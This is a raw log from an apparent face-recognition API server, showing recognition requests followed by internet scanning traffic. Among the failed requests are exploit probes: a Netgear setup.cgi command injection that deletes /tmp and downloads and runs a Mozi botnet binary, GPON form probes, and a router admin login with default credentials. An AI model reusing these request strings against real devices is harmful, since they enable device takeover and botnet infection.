2022-10-22 11:56:44.298 | DEBUG    | module.milvus_helpers:__init__:18 -  Successfully connect to MiLvus with IP: 0.0.0.0 and Port: 19530
INFO:     Started server process [3381944]
INFO:     Waiting for application startup.
INFO:     Application startup complete.
INFO:     Uvicorn running on http://0.0.0.0:8080 (Press CTRL+C to quit)
2022-10-22 11:57:12.269 | ERROR    | __main__:search:268 - Not face
box []
INFO:     123.24.206.26:58272 - "POST /recognize HTTP/1.1" 200 OK
2022-10-22 11:57:18.837 | ERROR    | __main__:search:268 - Not face
box []
INFO:     123.24.206.26:52467 - "POST /recognize HTTP/1.1" 200 OK
/media/ai-r-d/DATA1/Face_triton/service/face_service.py:274: DeprecationWarning: `np.int` is a deprecated alias for the builtin `int`. To silence this warning, use `int` by itself. Doing this will not modify any behavior and is safe. When replacing `np.int`, you may wish to use e.g. `np.int64` or `np.int32` to specify the precision. If you wish to review your current use, check the release note link for additional information.
Deprecated in NumPy 1.20; for more details and guidance: https://numpy.org/devdocs/release/1.20.0-notes.html#deprecations
  x1,y1,x2,y2,score = bbox.astype(np.int)
2022-10-22 11:58:08.348 | DEBUG    | module.milvus_helpers:search_vectors:161 - Successfully search in collection: ["['(distance: 296.844482421875, id: 436732162078934867)']"]
2022-10-22 11:58:08.348 | DEBUG    | module.mysql_helpers:search_by_milvus_ids:118 - MYSQL search by milvus id.
box [[108.770676 132.2422   465.30588  441.85596    0.626935]]
box [[108.770676 132.2422   465.30588  441.85596    0.626935]]
['(distance: 296.844482421875, id: 436732162078934867)']
('62846811f6f4201104b3af89', 'static/90ebbd7c4e8411ed904071c94499f8a6_62846811f6f4201104b3af89.jpg')
['static/90ebbd7c4e8411ed904071c94499f8a6_62846811f6f4201104b3af89.jpg']
['62846811f6f4201104b3af89']
[296.844482421875]
['static/90ebbd7c4e8411ed904071c94499f8a6_62846811f6f4201104b3af89.jpg']
time:  0.0749356746673584
id ['62846811f6f4201104b3af89']
distance [296.844482421875]
INFO:     123.24.206.26:57212 - "POST /recognize HTTP/1.1" 200 OK
2022-10-22 11:58:21.215 | DEBUG    | module.milvus_helpers:search_vectors:161 - Successfully search in collection: ["['(distance: 298.57794189453125, id: 436732162078934867)']"]
2022-10-22 11:58:21.215 | DEBUG    | module.mysql_helpers:search_by_milvus_ids:118 - MYSQL search by milvus id.
box [[146.21407   155.14565   478.73834   446.63867     0.7040156]]
box [[146.21407   155.14565   478.73834   446.63867     0.7040156]]
['(distance: 298.57794189453125, id: 436732162078934867)']
('62846811f6f4201104b3af89', 'static/90ebbd7c4e8411ed904071c94499f8a6_62846811f6f4201104b3af89.jpg')
['static/90ebbd7c4e8411ed904071c94499f8a6_62846811f6f4201104b3af89.jpg']
['62846811f6f4201104b3af89']
[298.57794189453125]
['static/90ebbd7c4e8411ed904071c94499f8a6_62846811f6f4201104b3af89.jpg']
time:  0.09029960632324219
id ['62846811f6f4201104b3af89']
distance [298.57794189453125]
INFO:     123.24.206.26:40999 - "POST /recognize HTTP/1.1" 200 OK
2022-10-22 11:59:09.775 | DEBUG    | module.milvus_helpers:search_vectors:161 - Successfully search in collection: ["['(distance: 273.011474609375, id: 436732162078941549)']"]
2022-10-22 11:59:09.775 | DEBUG    | module.mysql_helpers:search_by_milvus_ids:118 - MYSQL search by milvus id.
box [[142.18658   76.157776 492.80698  359.03577    0.643638]]
box [[142.18658   76.157776 492.80698  359.03577    0.643638]]
['(distance: 273.011474609375, id: 436732162078941549)']
('6284680ef6f4201104b3af75', 'static/2d4ceb3050df11ed833a4bc6a937cc45_6284680ef6f4201104b3af75.jpg')
['static/2d4ceb3050df11ed833a4bc6a937cc45_6284680ef6f4201104b3af75.jpg']
['6284680ef6f4201104b3af75']
[273.011474609375]
['static/2d4ceb3050df11ed833a4bc6a937cc45_6284680ef6f4201104b3af75.jpg']
time:  0.10545730590820312
id ['6284680ef6f4201104b3af75']
distance [273.011474609375]
INFO:     123.24.206.26:40748 - "POST /recognize HTTP/1.1" 200 OK
INFO:     112.46.68.4:3706 - "GET / HTTP/1.1" 404 Not Found
INFO:     112.46.68.4:4701 - "GET / HTTP/1.1" 404 Not Found
INFO:     112.46.68.4:5496 - "GET / HTTP/1.1" 404 Not Found
INFO:     112.46.68.4:6260 - "GET / HTTP/1.1" 404 Not Found
INFO:     112.46.68.4:7128 - "GET / HTTP/1.1" 404 Not Found
INFO:     112.46.68.4:7861 - "GET / HTTP/1.1" 404 Not Found
INFO:     112.46.68.4:9358 - "GET / HTTP/1.1" 404 Not Found
INFO:     112.46.68.4:10290 - "GET / HTTP/1.1" 404 Not Found
INFO:     112.46.68.4:11165 - "GET / HTTP/1.1" 404 Not Found
INFO:     112.46.68.4:11921 - "GET / HTTP/1.1" 404 Not Found
INFO:     112.46.68.4:12702 - "GET / HTTP/1.1" 404 Not Found
INFO:     112.46.68.4:13532 - "GET / HTTP/1.1" 404 Not Found
INFO:     112.46.68.4:16117 - "GET / HTTP/1.1" 404 Not Found
INFO:     112.46.68.4:17086 - "GET / HTTP/1.1" 404 Not Found
INFO:     112.46.68.4:18403 - "GET / HTTP/1.1" 404 Not Found
INFO:     112.46.68.4:19813 - "GET / HTTP/1.1" 404 Not Found
INFO:     112.46.68.4:20918 - "GET / HTTP/1.1" 404 Not Found
INFO:     112.46.68.4:21668 - "GET / HTTP/1.1" 404 Not Found
INFO:     112.46.68.4:22382 - "GET / HTTP/1.1" 404 Not Found
INFO:     112.46.68.4:23044 - "GET / HTTP/1.1" 404 Not Found
INFO:     112.46.68.4:23982 - "GET / HTTP/1.1" 404 Not Found
INFO:     112.46.68.4:24810 - "GET / HTTP/1.1" 404 Not Found
INFO:     112.46.68.4:25463 - "GET / HTTP/1.1" 404 Not Found
INFO:     112.46.68.4:26434 - "GET / HTTP/1.1" 404 Not Found
INFO:     112.46.68.4:27186 - "GET / HTTP/1.1" 404 Not Found
INFO:     112.46.68.4:27976 - "GET / HTTP/1.1" 404 Not Found
INFO:     112.46.68.4:28833 - "GET / HTTP/1.1" 404 Not Found
INFO:     112.46.68.4:29530 - "GET / HTTP/1.1" 404 Not Found
INFO:     112.46.68.4:30329 - "GET / HTTP/1.1" 404 Not Found
INFO:     112.46.68.4:31092 - "GET / HTTP/1.1" 404 Not Found
INFO:     112.46.68.4:32619 - "GET / HTTP/1.1" 404 Not Found
INFO:     112.46.68.4:33387 - "GET / HTTP/1.1" 404 Not Found
INFO:     112.46.68.4:34075 - "GET / HTTP/1.1" 404 Not Found
INFO:     112.46.68.4:34830 - "GET / HTTP/1.1" 404 Not Found
INFO:     112.46.68.4:35534 - "GET / HTTP/1.1" 404 Not Found
INFO:     112.46.68.4:36387 - "GET / HTTP/1.1" 404 Not Found
INFO:     112.46.68.4:37236 - "GET / HTTP/1.1" 404 Not Found
INFO:     112.46.68.4:38048 - "GET / HTTP/1.1" 404 Not Found
INFO:     112.46.68.4:38873 - "GET / HTTP/1.1" 404 Not Found
INFO:     112.46.68.4:39623 - "GET / HTTP/1.1" 404 Not Found
INFO:     112.46.68.4:40733 - "GET / HTTP/1.1" 404 Not Found
INFO:     112.46.68.4:41384 - "GET / HTTP/1.1" 404 Not Found
INFO:     112.46.68.4:42446 - "GET / HTTP/1.1" 404 Not Found
INFO:     112.46.68.4:43378 - "GET / HTTP/1.1" 404 Not Found
INFO:     112.46.68.4:44034 - "GET / HTTP/1.1" 404 Not Found
INFO:     112.46.68.4:44792 - "GET / HTTP/1.1" 404 Not Found
INFO:     112.46.68.4:45592 - "GET / HTTP/1.1" 404 Not Found
INFO:     112.46.68.4:46485 - "GET / HTTP/1.1" 404 Not Found
INFO:     112.46.68.4:47363 - "GET / HTTP/1.1" 404 Not Found
INFO:     112.46.68.4:48342 - "GET / HTTP/1.1" 404 Not Found
INFO:     112.46.68.4:50045 - "GET / HTTP/1.1" 404 Not Found
INFO:     112.46.68.4:51659 - "GET / HTTP/1.1" 404 Not Found
INFO:     112.46.68.4:52486 - "GET / HTTP/1.1" 404 Not Found
INFO:     112.46.68.4:53288 - "GET / HTTP/1.1" 404 Not Found
INFO:     112.46.68.4:54035 - "GET / HTTP/1.1" 404 Not Found
INFO:     112.46.68.4:54844 - "GET / HTTP/1.1" 404 Not Found
INFO:     112.46.68.4:55577 - "GET / HTTP/1.1" 404 Not Found
INFO:     112.46.68.4:56301 - "GET / HTTP/1.1" 404 Not Found
INFO:     112.46.68.4:57036 - "GET / HTTP/1.1" 404 Not Found
INFO:     112.46.68.4:57723 - "GET / HTTP/1.1" 404 Not Found
INFO:     112.46.68.4:58731 - "GET / HTTP/1.1" 404 Not Found
INFO:     112.46.68.4:59589 - "GET / HTTP/1.1" 404 Not Found
INFO:     112.46.68.4:60513 - "GET / HTTP/1.1" 404 Not Found
INFO:     112.46.68.4:61716 - "GET / HTTP/1.1" 404 Not Found
INFO:     112.46.68.4:62729 - "GET / HTTP/1.1" 404 Not Found
INFO:     112.46.68.4:63652 - "GET / HTTP/1.1" 404 Not Found
INFO:     112.46.68.4:64414 - "GET / HTTP/1.1" 404 Not Found
INFO:     112.46.68.4:65483 - "GET / HTTP/1.1" 404 Not Found
INFO:     112.46.68.4:1801 - "GET / HTTP/1.1" 404 Not Found
INFO:     112.46.68.4:2598 - "GET / HTTP/1.1" 404 Not Found
INFO:     112.46.68.4:3333 - "GET / HTTP/1.1" 404 Not Found
INFO:     45.162.227.51:42400 - "GET / HTTP/1.1" 404 Not Found
INFO:     205.210.31.133:58742 - "GET / HTTP/1.1" 404 Not Found
INFO:     205.210.31.184:57628 - "GET / HTTP/1.1" 404 Not Found
INFO:     198.199.93.172:37556 - "GET /actuator/health HTTP/1.1" 404 Not Found
INFO:     45.61.186.118:53826 - "GET /config/getuser?index=0 HTTP/1.1" 404 Not Found
WARNING:  Invalid HTTP request received.
WARNING:  Invalid HTTP request received.
INFO:     205.210.31.34:59714 - "GET / HTTP/1.1" 404 Not Found
INFO:     205.210.31.43:60328 - "GET / HTTP/1.1" 404 Not Found
INFO:     205.210.31.33:62012 - "GET / HTTP/1.1" 404 Not Found
INFO:     198.235.24.36:61226 - "GET / HTTP/1.1" 404 Not Found
INFO:     154.26.133.74:57895 - "GET / HTTP/1.1" 404 Not Found
INFO:     167.94.138.44:53316 - "GET / HTTP/1.1" 404 Not Found
INFO:     167.94.138.44:57298 - "GET / HTTP/1.1" 404 Not Found
WARNING:  Invalid HTTP request received.
INFO:     104.152.52.214:51076 - "GET / HTTP/1.0" 404 Not Found
INFO:     167.94.146.60:41808 - "GET / HTTP/1.1" 404 Not Found
INFO:     167.94.146.60:35366 - "GET / HTTP/1.1" 404 Not Found
WARNING:  Invalid HTTP request received.
INFO:     45.61.186.118:54804 - "GET /config/getuser?index=0 HTTP/1.1" 404 Not Found
INFO:     80.94.92.239:49450 - "GET / HTTP/1.1" 404 Not Found
INFO:     65.49.20.88:61623 - "GET / HTTP/1.1" 404 Not Found
INFO:     23.251.102.74:42168 - "GET / HTTP/1.1" 404 Not Found
INFO:     205.210.31.49:63356 - "GET / HTTP/1.1" 404 Not Found
INFO:     123.24.206.26:51008 - "GET / HTTP/1.1" 404 Not Found
INFO:     123.24.206.26:64868 - "GET / HTTP/1.1" 404 Not Found
INFO:     205.185.127.253:42694 - "GET / HTTP/1.1" 404 Not Found
INFO:     205.210.31.19:59626 - "GET / HTTP/1.1" 404 Not Found
WARNING:  Invalid HTTP request received.
WARNING:  Invalid HTTP request received.
WARNING:  Invalid HTTP request received.
WARNING:  Invalid HTTP request received.
2022-10-22 19:06:13.392 | DEBUG    | module.milvus_helpers:search_vectors:161 - Successfully search in collection: ["['(distance: 395.01495361328125, id: 436732162078936908)']"]
2022-10-22 19:06:13.392 | DEBUG    | module.mysql_helpers:search_by_milvus_ids:118 - MYSQL search by milvus id.
box [[173.85007    160.37334    523.97095    497.6214       0.67405033]]
box [[173.85007    160.37334    523.97095    497.6214       0.67405033]]
['(distance: 395.01495361328125, id: 436732162078936908)']
('62fc7496422ac27d7b64d8bc', 'static/423f89844e8811ed904071c94499f8a6_62fc7496422ac27d7b64d8bc.jpg')
['static/423f89844e8811ed904071c94499f8a6_62fc7496422ac27d7b64d8bc.jpg']
['62fc7496422ac27d7b64d8bc']
[395.01495361328125]
['static/423f89844e8811ed904071c94499f8a6_62fc7496422ac27d7b64d8bc.jpg']
time:  0.0730445384979248
id ['62fc7496422ac27d7b64d8bc']
distance [395.01495361328125]
INFO:     123.24.206.26:33751 - "POST /recognize HTTP/1.1" 200 OK
INFO:     38.55.18.180:27833 - "GET /?0.5925201162452373885084168 HTTP/1.1" 404 Not Found
INFO:     38.55.18.180:27833 - "GET /?0.18588595200087061594689616 HTTP/1.1" 404 Not Found
WARNING:  Invalid HTTP request received.
INFO:     205.210.31.60:57596 - "GET / HTTP/1.1" 404 Not Found
INFO:     27.43.205.196:13094 - "GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://192.168.1.1:8088/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 HTTP/1.0" 404 Not Found
INFO:     198.235.24.39:62638 - "GET / HTTP/1.1" 404 Not Found
WARNING:  Invalid HTTP request received.
INFO:     103.40.199.233:51470 - "POST /GponForm/diag_Form?images/ HTTP/1.1" 404 Not Found
INFO:     205.210.31.10:59466 - "GET / HTTP/1.1" 404 Not Found
INFO:     205.210.31.184:62186 - "GET / HTTP/1.1" 404 Not Found
INFO:     205.210.31.163:62722 - "GET / HTTP/1.1" 404 Not Found
INFO:     141.164.123.223:47619 - "GET / HTTP/1.1" 404 Not Found
INFO:     45.128.185.110:63289 - "GET / HTTP/1.1" 404 Not Found
INFO:     45.128.185.110:63289 - "GET / HTTP/1.1" 404 Not Found
INFO:     46.174.191.30:38364 - "GET / HTTP/1.0" 404 Not Found
INFO:     205.210.31.143:59262 - "GET / HTTP/1.1" 404 Not Found
INFO:     205.210.31.138:59170 - "GET / HTTP/1.1" 404 Not Found
INFO:     205.210.31.36:59528 - "GET / HTTP/1.1" 404 Not Found
INFO:     185.149.232.198:60792 - "POST /GponForm/diag_Form?script/ HTTP/1.1" 404 Not Found
WARNING:  Unsupported upgrade request.
INFO:     93.153.86.70:50850 - "GET / HTTP/1.1" 404 Not Found
INFO:     205.210.31.132:63466 - "GET / HTTP/1.1" 404 Not Found
WARNING:  Invalid HTTP request received.
INFO:     123.24.206.26:36581 - "GET / HTTP/1.1" 404 Not Found
INFO:     123.24.206.26:57936 - "GET / HTTP/1.1" 404 Not Found
INFO:     176.114.144.145:33111 - "GET / HTTP/1.1" 404 Not Found
WARNING:  Invalid HTTP request received.
WARNING:  Invalid HTTP request received.
WARNING:  Invalid HTTP request received.
INFO:     134.236.137.51:47653 - "GET / HTTP/1.1" 404 Not Found
INFO:     205.185.127.253:56080 - "GET / HTTP/1.1" 404 Not Found
WARNING:  Invalid HTTP request received.
WARNING:  Invalid HTTP request received.
WARNING:  Invalid HTTP request received.
WARNING:  Invalid HTTP request received.
INFO:     192.241.208.247:56308 - "GET / HTTP/1.1" 404 Not Found
WARNING:  Invalid HTTP request received.
INFO:     192.241.215.118:40242 - "GET / HTTP/1.1" 404 Not Found
INFO:     45.61.186.118:42670 - "GET /config/getuser?index=0 HTTP/1.1" 404 Not Found
WARNING:  Unsupported upgrade request.
WARNING:  Invalid HTTP request received.
INFO:     80.94.92.239:50374 - "GET / HTTP/1.1" 404 Not Found
INFO:     85.67.13.201:58770 - "GET / HTTP/1.1" 404 Not Found
WARNING:  Unsupported upgrade request.
INFO:     45.61.186.118:34500 - "GET /config/getuser?index=0 HTTP/1.1" 404 Not Found
INFO:     202.124.231.170:47684 - "GET / HTTP/1.1" 404 Not Found
INFO:     118.70.150.130:32872 - "GET / HTTP/1.1" 404 Not Found
INFO:     138.197.160.9:48048 - "HEAD / HTTP/1.1" 404 Not Found
INFO:     219.157.213.99:35766 - "GET /boaform/admin/formLogin?username=ec8&psd=ec8 HTTP/1.0" 404 Not Found
WARNING:  Invalid HTTP request received.
WARNING:  Invalid HTTP request received.
WARNING:  Invalid HTTP request received.
WARNING:  Invalid HTTP request received.
WARNING:  Invalid HTTP request received.
INFO:     179.43.163.105:59748 - "POST / HTTP/1.1" 404 Not Found
INFO:     167.94.145.58:33094 - "GET / HTTP/1.1" 404 Not Found
INFO:     167.94.145.58:50054 - "GET / HTTP/1.1" 404 Not Found
WARNING:  Invalid HTTP request received.
INFO:     46.174.191.28:38364 - "GET / HTTP/1.0" 404 Not Found
INFO:     78.108.177.54:37974 - "GET / HTTP/1.0" 404 Not Found
INFO:     151.246.17.221:26798 - "GET / HTTP/1.1" 404 Not Found
INFO:     64.62.197.60:6385 - "GET / HTTP/1.1" 404 Not Found
INFO:     154.89.5.124:56924 - "GET / HTTP/1.0" 404 Not Found
INFO:     128.1.248.26:34222 - "GET / HTTP/1.1" 404 Not Found
INFO:     41.139.149.158:34429 - "GET / HTTP/1.1" 404 Not Found
WARNING:  Invalid HTTP request received.
WARNING:  Invalid HTTP request received.
WARNING:  Invalid HTTP request received.
INFO:     152.89.196.211:40434 - "GET /?XDEBUG_SESSION_START=phpstorm HTTP/1.1" 404 Not Found
INFO:     123.24.206.26:56793 - "GET / HTTP/1.1" 404 Not Found
INFO:     123.24.206.26:36417 - "GET / HTTP/1.1" 404 Not Found
INFO:     78.108.177.54:37974 - "GET / HTTP/1.0" 404 Not Found
WARNING:  Invalid HTTP request received.
INFO:     45.61.186.118:35468 - "GET /config/getuser?index=0 HTTP/1.1" 404 Not Found
INFO:     128.14.134.134:36836 - "GET / HTTP/1.1" 404 Not Found
WARNING:  Invalid HTTP request received.
WARNING:  Invalid HTTP request received.
WARNING:  Invalid HTTP request received.
WARNING:  Invalid HTTP request received.
INFO:     43.135.123.64:50888 - "GET / HTTP/1.1" 404 Not Found
INFO:     92.118.39.78:44232 - "GET / HTTP/1.1" 404 Not Found
INFO:     2.182.150.16:34357 - "GET / HTTP/1.1" 404 Not Found
WARNING:  Invalid HTTP request received.
WARNING:  Invalid HTTP request received.
WARNING:  Invalid HTTP request received.
WARNING:  Invalid HTTP request received.
WARNING:  Invalid HTTP request received.
WARNING:  Invalid HTTP request received.
WARNING:  Invalid HTTP request received.
WARNING:  Invalid HTTP request received.
WARNING:  Invalid HTTP request received.
WARNING:  Invalid HTTP request received.
INFO:     45.61.186.118:34264 - "GET /config/getuser?index=0 HTTP/1.1" 404 Not Found
WARNING:  Invalid HTTP request received.
WARNING:  Invalid HTTP request received.
WARNING:  Invalid HTTP request received.
WARNING:  Invalid HTTP request received.
WARNING:  Invalid HTTP request received.
WARNING:  Invalid HTTP request received.
WARNING:  Invalid HTTP request received.
WARNING:  Invalid HTTP request received.
WARNING:  Invalid HTTP request received.
WARNING:  Invalid HTTP request received.
WARNING:  Invalid HTTP request received.
WARNING:  Invalid HTTP request received.
WARNING:  Invalid HTTP request received.
WARNING:  Invalid HTTP request received.
WARNING:  Invalid HTTP request received.
WARNING:  Invalid HTTP request received.
WARNING:  Invalid HTTP request received.
WARNING:  Invalid HTTP request received.
WARNING:  Invalid HTTP request received.
WARNING:  Invalid HTTP request received.
WARNING:  Invalid HTTP request received.
WARNING:  Invalid HTTP request received.
WARNING:  Invalid HTTP request received.
WARNING:  Invalid HTTP request received.
WARNING:  Invalid HTTP request received.
WARNING:  Invalid HTTP request received.
WARNING:  Invalid HTTP request received.
WARNING:  Invalid HTTP request received.
WARNING:  Invalid HTTP request received.
WARNING:  Invalid HTTP request received.
WARNING:  Invalid HTTP request received.
WARNING:  Invalid HTTP request received.
WARNING:  Invalid HTTP request received.
WARNING:  Invalid HTTP request received.
WARNING:  Invalid HTTP request received.
WARNING:  Invalid HTTP request received.
WARNING:  Invalid HTTP request received.
WARNING:  Invalid HTTP request received.
WARNING:  Invalid HTTP request received.
